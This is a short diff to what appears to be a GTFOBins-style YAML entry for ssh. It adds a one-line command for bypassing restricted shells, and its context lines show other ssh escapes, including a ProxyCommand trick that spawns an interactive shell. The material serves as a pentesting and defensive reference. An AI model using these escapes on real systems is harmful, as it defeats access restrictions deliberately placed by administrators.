@@ -3,6 +3,8 @@ functions:
   shell:
     - description: Reconnecting may help bypassing restricted shells.
       code: ssh localhost $SHELL --noprofile --norc
+    - description: Connecting a different way may help bypassing restricted shells.
+      code: ssh localhost -t "bash --noprofile"
     - description: Spawn interactive shell through ProxyCommand option.
       code: ssh -o ProxyCommand=';sh 0<&2 1>&2' x
     - description: Spawn interactive shell on client, requires a successful connection towards `host`.
